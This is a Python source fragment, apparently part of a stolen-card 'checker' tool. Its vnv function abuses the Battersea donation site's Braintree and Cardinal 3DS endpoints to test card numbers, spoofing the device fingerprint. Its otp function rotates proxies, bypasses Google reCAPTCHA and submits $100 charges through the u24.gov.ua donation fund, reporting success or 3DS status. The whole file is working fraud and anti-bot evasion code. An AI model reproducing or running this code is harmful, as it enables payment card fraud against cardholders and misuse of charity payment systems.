	elif 'challenge_required' in vbv:
	       return '3DS Challenge Required '
	elif 'authenticate_attempt_successful' in vbv:
	       return '3DS Authenticate Attempt Successful '
	elif 'authenticate_rejected' in vbv:
	       return '3DS Authenticate Rejected '
	elif 'authenticate_frictionless_failed' in vbv:
	       return '3DS Authenticate Frictionless Failed '
	elif 'lookup_card_error' in vbv:
	       return 'lookup_card_error ⚠️'
	elif 'lookup_error' in vbv:
	       return 'Unknown Error ⚠️'
	return vbv
def vnv(ccx):
	email = f"{str(uuid.uuid4())[:8]}@gmail.com"
	import requests,re,base64,jwt,json
	def getstr(text: str, a: str, b: str) -> str:
	    try:
	        return text.split(a)[1].split(b)[0]
	    except IndexError:
	        return None
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvv = ccx.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	r =requests.session()
	from user_agent import generate_user_agent
	user = generate_user_agent()
	session =requests.session()
	headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
}
	response = session.get('https://donate.battersea.org.uk/appeals/default/', headers=headers)
	headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'referer': 'https://donate.battersea.org.uk/appeals/default/',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
}
	params = {
    'amount': '10',
    'appeal': 'donate',
}
	response = session.get('https://donate.battersea.org.uk/single-donation/step1/', params=params, headers=headers)
	cartid = getstr(response.text, '"entity_id":"', '"')
	b_token_encrypted = getstr(response.text, 'btToken" value="','"')
	b_token_decrypted = str(base64.b64decode(b_token_encrypted))
	btoken = getstr(b_token_decrypted, '"authorizationFingerprint":"', '","')
	merchantId = getstr(b_token_decrypted, 'merchantId":"', '","')
	b_token = "Bearer "+btoken
	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-US,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': b_token,
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://donate.battersea.org.uk',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
}
	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': str(uuid.uuid4()),
    },
    'query': 'query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       privacyUrl       userAgreementUrl       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment     }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }',
    'operationName': 'ClientConfiguration',
}
	response = session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	cardnal = getstr(response.text,'cardinalAuthenticationJWT":"','"')
	clientId = getstr(response.text,'"clientId":"','"')
	headers = {
    'authority': 'centinelapi.cardinalcommerce.com',
    'accept': '*/*',
    'accept-language': 'ar-US,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/json;charset=UTF-8',
    'origin': 'https://donate.battersea.org.uk',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'x-cardinal-tid': 'Tid-7d018cba-a57c-4d7c-bd16-5ad76a229b1e',
}
	json_data = {
    'BrowserPayload': {
        'Order': {
            'OrderDetails': {},
            'Consumer': {
                'BillingAddress': {},
                'ShippingAddress': {},
                'Account': {},
            },
            'Cart': [],
            'Token': {},
            'Authorization': {},
            'Options': {},
            'CCAExtension': {},
        },
        'SupportsAlternativePayments': {
            'cca': True,
            'hostedFields': False,
            'applepay': False,
            'discoverwallet': False,
            'wallet': False,
            'paypal': False,
            'visacheckout': False,
        },
    },
    'Client': {
        'Agent': 'SongbirdJS',
        'Version': '1.35.0',
    },
    'ConsumerSessionId': '0_b00ba69d-dc4c-43b9-b8d4-f9ce057da354',
    'ServerJWT': cardnal,
}
	response = session.post('https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init', headers=headers, json=json_data)
	payload = getstr(response.text,'CardinalJWT":"','"')
	payload_dict = jwt.decode(payload, options={"verify_signature": False})
	reference_id = payload_dict['ReferenceId']
	headers = {
    'authority': 'geo.cardinalcommerce.com',
    'accept': '*/*',
    'accept-language': 'ar-US,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/json',
    'origin': 'https://geo.cardinalcommerce.com',
    'referer': 'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render?threatmetrix=true&alias=Default&orgUnitId=6089fd715d61a54891c38c72&tmEventType=PAYMENT&referenceId=0_b00ba69d-dc4c-43b9-b8d4-f9ce057da354&geolocation=false&origin=Songbird',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}
	json_data = {
    'Cookies': {
        'Legacy': True,
        'LocalStorage': True,
        'SessionStorage': True,
    },
    'DeviceChannel': 'Browser',
    'Extended': {
        'Browser': {
            'Adblock': True,
            'AvailableJsFonts': [],
            'DoNotTrack': 'unknown',
            'JavaEnabled': False,
        },
        'Device': {
            'ColorDepth': 24,
            'Cpu': 'unknown',
            'Platform': 'Linux armv81',
            'TouchSupport': {
                'MaxTouchPoints': 5,
                'OnTouchStartAvailable': True,
                'TouchEventCreationSuccessful': True,
            },
        },
    },
    'Fingerprint': '1965c9ede0e3aef70fa3be6a4ed0c8e7',
    'FingerprintingTime': 1457,
    'FingerprintDetails': {
        'Version': '1.5.1',
    },
    'Language': 'ar-US',
    'Latitude': None,
    'Longitude': None,
    'OrgUnitId': '6089fd715d61a54891c38c72',
    'Origin': 'Songbird',
    'Plugins': [],
    'ReferenceId': reference_id,
    'Referrer': '',
    'Screen': {
        'FakedResolution': False,
        'Ratio': 2.2216981132075473,
        'Resolution': '942x424',
        'UsableResolution': '942x424',
        'CCAScreenSize': '02',
    },
    'CallSignEnabled': None,
    'ThreatMetrixEnabled': False,
    'ThreatMetrixEventType': 'PAYMENT',
    'ThreatMetrixAlias': 'Default',
    'TimeOffset': -180,
    'UserAgent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'UserAgentDetails': {
        'FakedOS': False,
        'FakedBrowser': False,
    },
    'BinSessionId': '54e625d3-4e50-4179-8260-947e761d1b39',
}
	response = session.post(
    'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData',
    headers=headers,
    json=json_data,
)
	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-US,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': b_token,
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
}
	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': str(uuid.uuid4()),
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvv,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}
	response = session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	token_bc = getstr(response.text, '"token":"', '"')
	headers = {
    'authority': 'api.braintreegateway.com',
    'accept': '*/*',
    'accept-language': 'ar-US,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/json',
    'origin': 'https://donate.battersea.org.uk',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
}
	json_data = {
    'amount': 10.3,
    'additionalInfo': {
        'shippingGivenName': 'The',
        'shippingSurname': 'Alex',
        'billingLine1': '1017 Bewicks Ct',
        'billingLine2': '',
        'billingPostalCode': '92011-4874',
        'billingCountryCode': 'US',
        'billingGivenName': 'The',
        'billingSurname': 'Alex',
        'shippingLine1': '1017 Bewicks Ct',
        'shippingLine2': '',
        'shippingPostalCode': '92011-4874',
        'shippingCountryCode': 'US',
        'email': email,
    },
    'dfReferenceId': reference_id,
    'clientMetadata': {
        'requestedThreeDSecureVersion': '2',
        'sdkVersion': 'web/3.71.1',
        'cardinalDeviceDataCollectionTimeElapsed': 414,
        'issuerDeviceDataCollectionTimeElapsed': 420,
        'issuerDeviceDataCollectionResult': True,
    },
    'authorizationFingerprint': btoken,
    'braintreeLibraryVersion': 'braintree/web/3.71.1',
    '_meta': {
        'merchantAppId': 'donate.battersea.org.uk',
        'platform': 'web',
        'sdkVersion': '3.71.1',
        'source': 'client',
        'integration': 'custom',
        'integrationType': 'custom',
        'sessionId': str(uuid.uuid4()),
    },
}
	response = session.post(
    f'https://api.braintreegateway.com/merchants/87f8xhr7xbbxdjzb/client_api/v1/payment_methods/{token_bc}/three_d_secure/lookup',
    headers=headers,
    json=json_data,
)
	vbv = response.json()["paymentMethod"]["threeDSecureInfo"]["status"]
	if 'authenticate_successful' in vbv:
	       return '3DS Authenticate Successful'
	elif 'challenge_required' in vbv:
	       return '3DS Challenge Required '
	elif 'authenticate_attempt_successful' in vbv:
	       return '3DS Authenticate Attempt Successful '
	elif 'authenticate_rejected' in vbv:
	       return '3DS Authenticate Rejected '
	elif 'authenticate_frictionless_failed' in vbv:
	       return '3DS Authenticate Frictionless Failed '
	elif 'lookup_card_error' in vbv:
	       return 'lookup_card_error ⚠️'
	elif 'lookup_error' in vbv:
	       return 'Unknown Error ⚠️'
	return vbv
def otp(ccx):
	import requests,random
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	coder = requests.session()
	with open("coder.txt", "r") as f:
		lines = f.read().splitlines()
	selected = random.choice(lines)
	host, port = selected.strip().split(":")
	proxy_auth = f"{host}:{port}"
	proxies = {
	    "http": f"http://{proxy_auth}",
	    "https": f"http://{proxy_auth}",
	}
	headers = {
    'Origin': 'https://u24.gov.ua',
    'Referer': 'https://u24.gov.ua/',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
	}
	response = coder.get('https://u24.gov.ua/main-es2015.84b5ad88cc9c73c36b1e.js', headers=headers, proxies=proxies)
	client_secret = re.search(r'ugb:{widgetGenericKey:"(.*?)"', response.text).group(1)
	###################
	headers = {
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
	    'content-type': 'application/json',
	    'origin': 'https://u24.gov.ua',
	    'priority': 'u=1, i',
	    'referer': 'https://u24.gov.ua/',
	    'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
	    'sec-ch-ua-mobile': '?0',
	    'sec-ch-ua-platform': '"Windows"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
	}
	json_data = {
	    'key': client_secret,
	    'location': 'https://u24.gov.ua/',
	    'host': 'u24.gov.ua',
	}
	response = coder.post('https://ecom.ukrgasbank.com/api/v1/widget', headers=headers, json=json_data, proxies=proxies)
	ssid = re.search(r'"ssid":"(.*?)"', response.text).group(1)
	#print(ssid)
	time.sleep(5)
	######################
	headers = {
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
	    'origin': 'https://widget.cp.ukrgasbank.com',
	    'priority': 'u=1, i',
	    'referer': 'https://widget.cp.ukrgasbank.com/',
	    'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
	    'sec-ch-ua-mobile': '?0',
	    'sec-ch-ua-platform': '"Windows"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
	}
	
	json_data = {
	    'ssid': ssid,
	    'card_number': n,
	    'card_exp_month': mm,
	    'card_exp_year': yy,
	    'card_cvv': cvc,
	}
	
	response = requests.post('https://ecom.ukrgasbank.com/api/v1/token/card', headers=headers, json=json_data, proxies=proxies)
	token = re.search(r'"token":"(.*?)"', response.text).group(1)
	#print(token)
	##########################
	headers_get = {
	        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
	        "Pragma": "no-cache",
	        "Accept": "*/*"
	    }
	url_get = "https://www.google.com/recaptcha/api2/anchor"
	params_get = {
	        "ar": "1",
	        "k": "6LeO0mUfAAAAAFeZmGNtHbUaUn1bGrbAhxMnxY3A",
	        "co": "aHR0cHM6Ly91MjQuZ292LnVhOjQ0Mw..",
	        "hl": "en",
	        "v": "GUGrl5YkSwpBsxsF3eY665Ye",
	        "size": "invisible",
	        "cb": "3f0ix3e46u0e"
	}
	response_get = requests.get(url_get, headers=headers_get, params=params_get)
	source_html = response_get.text
	token_match = re.search(r'type="hidden" id="recaptcha-token" value="(.*?)"', source_html)
	tk = token_match.group(1)
	headers_post = {
	        "User-Agent": headers_get["User-Agent"],
	        "Pragma": "no-cache",
	        "Accept": "*/*",
	        "accept-encoding": "gzip, deflate, br",
	        "accept-language": "fa,en;q=0.9,en-GB;q=0.8,en-US;q=0.7",
	        "origin": "https://www.google.com",
	        "sec-fetch-dest": "empty",
	        "sec-fetch-mode": "cors",
	        "sec-fetch-site": "same-origin"
	    }
	url_post = "https://www.google.com/recaptcha/api2/reload?k=6LeO0mUfAAAAAFeZmGNtHbUaUn1bGrbAhxMnxY3A"
	payload = {
	        "v": "GUGrl5YkSwpBsxsF3eY665Ye",
	        "reason": "q",
	        "c": tk,
	        "k": "6LeO0mUfAAAAAFeZmGNtHbUaUn1bGrbAhxMnxY3A",
	        "co": "aHR0cHM6Ly91MjQuZ292LnVhOjQ0Mw..",
	        "hl": "en",
	        "size": "invisible",
	    }
	response_post = requests.post(url_post, headers=headers_post, data=payload)
	source_post = response_post.text
	tr_match = re.search(r'\["rresp","(.*?)"\]', source_post)
	tr = tr_match.group(1) if tr_match else None
	text = f"""{tr}"""
	split_marker = '",nul'
	index = text.find(split_marker)
	if index != -1:
	    result = text[:index]
	else:
	    result = text
	##########################
	headers = {
	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
	    'origin': 'https://u24.gov.ua',
	    'referer': 'https://u24.gov.ua/result/error',
	    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
	}
	json_data = {
	    'amount': '100.00',
	    'amountFee': '1.60',
	    'currency': 'usd',
	    'token': token,
	    'lang': 'en',
	    'direction': 'defend',
	    'browserFingerprint': {
	        'browserColorDepth': 24,
	        'browserScreenHeight': 1024,
	        'browserScreenWidth': 1280,
	        'browserJavaEnabled': False,
	        'browserLanguage': 'en-US',
	        'browserTimeZone': 'Africa/Cairo',
	        'browserTimeZoneOffset': -180,
	        'browserUserAgent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
	    },
	    'payway': '',
	    'email': '',
	    'contestType': None,
	    'recaptcha': result,
	}
	response = coder.post('https://u24.gov.ua/api/invoice/ugb/create/direct', headers=headers, json=json_data, proxies=proxies, timeout=60)
	msg = re.search(r'"status_description":"(.*?)"', response.text).group(1)
	#print(response.text)
	if re.search(r'"status":"failure"', response.text):
	    return '3DS Authenticate Successful'
	elif re.search(r'"status":"(success|succeed|succeeded)"', response.text):
	    return 'Charge 100$'
	else:
	    return msg